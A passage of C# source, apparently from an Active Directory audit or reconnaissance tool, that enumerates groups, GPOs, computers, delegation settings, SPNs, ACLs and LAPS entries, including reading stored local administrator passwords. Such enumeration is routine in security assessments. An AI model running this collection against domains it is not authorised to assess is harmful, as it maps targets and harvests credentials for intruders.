                        MemberUserName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }

                    if (Groups.Contains(SamAccountType))
                    {
                        AccountType = "group";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (Users.Contains(SamAccountType))
                    {
                        AccountType = "user";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (Computers.Contains(SamAccountType))
                    {
                        AccountType = "computer";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (TrustAccounts.Contains(SamAccountType))
                    {
                        AccountType = "trust";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );
                    }
                    return GroupsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class OURecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdOU = (SearchResult) record;

                    PSObject OUObj = new PSObject();
                    OUObj.Members.Add(new PSNoteProperty("Name", AdOU.Properties["name"][0]));
                    OUObj.Members.Add(new PSNoteProperty("Depth", ((Convert.ToString(AdOU.Properties["distinguishedname"][0]).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1)));
                    OUObj.Members.Add(new PSNoteProperty("Description", (AdOU.Properties["description"].Count != 0 ? AdOU.Properties["description"][0] : "")));
                    OUObj.Members.Add(new PSNoteProperty("whenCreated", AdOU.Properties["whencreated"][0]));
                    OUObj.Members.Add(new PSNoteProperty("whenChanged", AdOU.Properties["whenchanged"][0]));
                    OUObj.Members.Add(new PSNoteProperty("DistinguishedName", AdOU.Properties["distinguishedname"][0]));
                    return new PSObject[] { OUObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGPO = (SearchResult) record;

                    PSObject GPOObj = new PSObject();
                    GPOObj.Members.Add(new PSNoteProperty("DisplayName", CleanString(AdGPO.Properties["displayname"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("GUID", CleanString(AdGPO.Properties["name"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("whenCreated", AdGPO.Properties["whenCreated"][0]));
                    GPOObj.Members.Add(new PSNoteProperty("whenChanged", AdGPO.Properties["whenChanged"][0]));
                    GPOObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGPO.Properties["distinguishedname"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("FilePath", AdGPO.Properties["gpcfilesyspath"][0]));
                    return new PSObject[] { GPOObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGPO = (SearchResult) record;
                    LDAPClass.AdGPODictionary.Add((Convert.ToString(AdGPO.Properties["distinguishedname"][0]).ToUpper()), (Convert.ToString(AdGPO.Properties["displayname"][0])));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SOMRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdSOM = (SearchResult) record;

                    List<PSObject> SOMsList = new List<PSObject>();
                    int Depth = 0;
                    bool BlockInheritance = false;
                    bool? LinkEnabled = null;
                    bool? Enforced = null;
                    string gPLink = (AdSOM.Properties["gPLink"].Count != 0 ? Convert.ToString(AdSOM.Properties["gPLink"][0]) : "");
                    string GPOName = null;

                    Depth = ((Convert.ToString(AdSOM.Properties["distinguishedname"][0]).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1);
                    if (AdSOM.Properties["gPOptions"].Count != 0)
                    {
                        if ((int) AdSOM.Properties["gPOptions"][0] == 1)
                        {
                            BlockInheritance = true;
                        }
                    }
                    var GPLinks = gPLink.Split(']', '[').Where(x => x.StartsWith("LDAP"));
                    int Order = (GPLinks.ToArray()).Length;
                    if (Order == 0)
                    {
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Properties["name"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Properties["distinguishedname"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", null));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", (AdSOM.Properties["gpoptions"].Count != 0 ? AdSOM.Properties["gpoptions"][0] : "")));
                        SOMsList.Add( SOMObj );
                    }
                    foreach (string link in GPLinks)
                    {
                        string[] linksplit = link.Split('/', ';');
                        if (!Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 1)))
                        {
                            LinkEnabled = true;
                        }
                        else
                        {
                            LinkEnabled = false;
                        }
                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = LDAPClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? LDAPClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split('=',',')[1];
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Properties["name"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Properties["distinguishedname"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", Order));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", (AdSOM.Properties["gpoptions"].Count != 0 ? AdSOM.Properties["gpoptions"][0] : "")));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdPrinter = (SearchResult) record;

                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty("Name", AdPrinter.Properties["Name"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("ServerName", AdPrinter.Properties["serverName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("ShareName", AdPrinter.Properties["printShareName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverName", AdPrinter.Properties["driverName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverVersion", AdPrinter.Properties["driverVersion"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("PortName", AdPrinter.Properties["portName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("URL", AdPrinter.Properties["url"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("whenCreated", AdPrinter.Properties["whenCreated"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("whenChanged", AdPrinter.Properties["whenChanged"][0]));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    bool Dormant = false;
                    bool? Enabled = null;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool? TrustedforDelegation = null;
                    bool? TrustedtoAuthforDelegation = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    string StrIPAddress = null;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Properties["dnshostname"].Count != 0)
                    {
                        try
                        {
                            StrIPAddress = Convert.ToString(Dns.GetHostEntry(Convert.ToString(AdComputer.Properties["dnshostname"][0])).AddressList[0]);
                        }
                        catch
                        {
                            StrIPAddress = null;
                        }
                    }
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdComputer.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdComputer.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                        TrustedforDelegation = (userFlags & UACFlags.TRUSTED_FOR_DELEGATION) == UACFlags.TRUSTED_FOR_DELEGATION;
                        TrustedtoAuthforDelegation = (userFlags & UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
                    }
                    if (AdComputer.Properties["lastlogontimestamp"].Count != 0)
                    {
                        LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Properties["lastlogontimestamp"][0]));
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Properties["pwdlastset"].Count != 0)
                    {
                        PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Properties["pwdlastset"][0]));
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) TrustedforDelegation) && ((int) AdComputer.Properties["primarygroupid"][0] == 515) )
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdComputer.Properties["msDS-AllowedToDelegateTo"].Count >= 1)
                    {
                        DelegationType = "Constrained";
                        for (int i = 0; i < AdComputer.Properties["msDS-AllowedToDelegateTo"].Count; i++)
                        {
                            var delegateto = AdComputer.Properties["msDS-AllowedToDelegateTo"][i];
                            DelegationServices = DelegationServices + "," + Convert.ToString(delegateto);
                        }
                        DelegationServices = DelegationServices.TrimStart(',');
                    }
                    if ((bool) TrustedtoAuthforDelegation)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }
                    string SIDHistory = "";
                    if (AdComputer.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdComputer.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdComputer.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }
                    string OperatingSystem = CleanString((AdComputer.Properties["operatingsystem"].Count != 0 ? AdComputer.Properties["operatingsystem"][0] : "-") + " " + (AdComputer.Properties["operatingsystemhotfix"].Count != 0 ? AdComputer.Properties["operatingsystemhotfix"][0] : " ") + " " + (AdComputer.Properties["operatingsystemservicepack"].Count != 0 ? AdComputer.Properties["operatingsystemservicepack"][0] : " ") + " " + (AdComputer.Properties["operatingsystemversion"].Count != 0 ? AdComputer.Properties["operatingsystemversion"][0] : " "));

                    PSObject ComputerObj = new PSObject();
                    ComputerObj.Members.Add(new PSNoteProperty("UserName", (AdComputer.Properties["samaccountname"].Count != 0 ? CleanString(AdComputer.Properties["samaccountname"][0]) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Name", (AdComputer.Properties["name"].Count != 0 ? CleanString(AdComputer.Properties["name"][0]) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("DNSHostName", (AdComputer.Properties["dnshostname"].Count != 0 ? AdComputer.Properties["dnshostname"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    ComputerObj.Members.Add(new PSNoteProperty("IPv4Address", StrIPAddress));
                    ComputerObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    ComputerObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty("Primary Group ID", (AdComputer.Properties["primarygroupid"].Count != 0 ? AdComputer.Properties["primarygroupid"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdComputer.Properties["objectSID"][0], 0))));
                    ComputerObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty("Description", (AdComputer.Properties["Description"].Count != 0 ? CleanString(AdComputer.Properties["Description"][0]) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("ms-ds-CreatorSid", (AdComputer.Properties["ms-ds-CreatorSid"].Count != 0 ? Convert.ToString(new SecurityIdentifier((byte[])AdComputer.Properties["ms-ds-CreatorSid"][0], 0)) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty("UserAccountControl", (AdComputer.Properties["useraccountcontrol"].Count != 0 ? AdComputer.Properties["useraccountcontrol"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("whenCreated", AdComputer.Properties["whencreated"][0]));
                    ComputerObj.Members.Add(new PSNoteProperty("whenChanged", AdComputer.Properties["whenchanged"][0]));
                    ComputerObj.Members.Add(new PSNoteProperty("Distinguished Name", AdComputer.Properties["distinguishedname"][0]));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    if (AdComputer.Properties["serviceprincipalname"].Count == 0)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();

                    foreach (string SPN in AdComputer.Properties["serviceprincipalname"])
                    {
                        string[] SPNArray = SPN.Split('/');
                        bool flag = true;
                        foreach (PSObject Obj in SPNList)
                        {
                            if ( (string) Obj.Members["Service"].Value == SPNArray[0] )
                            {
                                Obj.Members["Host"].Value = string.Join(",", (Obj.Members["Host"].Value + "," + SPNArray[1]).Split(',').Distinct().ToArray());
                                flag = false;
                            }
                        }
                        if (flag)
                        {
                            PSObject ComputerSPNObj = new PSObject();
                            ComputerSPNObj.Members.Add(new PSNoteProperty("UserName", (AdComputer.Properties["samaccountname"].Count != 0 ? CleanString(AdComputer.Properties["samaccountname"][0]) : "")));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Name", (AdComputer.Properties["name"].Count != 0 ? CleanString(AdComputer.Properties["name"][0]) : "")));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                            SPNList.Add( ComputerSPNObj );
                        }
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    bool PasswordStored = false;
                    DateTime? CurrentExpiration = null;
                    if (AdComputer.Properties["ms-mcs-admpwdexpirationtime"].Count != 0)
                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Properties["ms-mcs-admpwdexpirationtime"][0]));
                        PasswordStored = true;
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty("Hostname", (AdComputer.Properties["dnshostname"].Count != 0 ? AdComputer.Properties["dnshostname"][0] : AdComputer.Properties["cn"][0] )));
                    LAPSObj.Members.Add(new PSNoteProperty("Stored", PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty("Readable", (AdComputer.Properties["ms-mcs-admpwd"].Count != 0 ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty("Password", (AdComputer.Properties["ms-mcs-admpwd"].Count != 0 ? AdComputer.Properties["ms-mcs-admpwd"][0] : null)));
                    LAPSObj.Members.Add(new PSNoteProperty("Expiration", CurrentExpiration));
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                        case "computer":
                        case "group":
                            LDAPClass.AdSIDDictionary.Add(Convert.ToString(new SecurityIdentifier((byte[])AdObject.Properties["objectSID"][0], 0)), (Convert.ToString(AdObject.Properties["name"][0])));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    byte[] ntSecurityDescriptor = null;
                    string Name = null;
                    string Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Properties["name"][0]);

                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Properties["displayname"][0]);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdObject.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdObjectEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdObjectEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            string Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("AccessControlType", Rule.AccessControlType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("OwnerName", LDAPClass.AdSIDDictionary.ContainsKey(Owner) ? LDAPClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("Owner", Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("DistinguishedName", AdObject.Properties["distinguishedname"][0]));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    byte[] ntSecurityDescriptor = null;
                    string Name = null;
                    string Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Properties["name"][0]);

                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Properties["displayname"][0]);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdObject.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdObjectEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdObjectEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
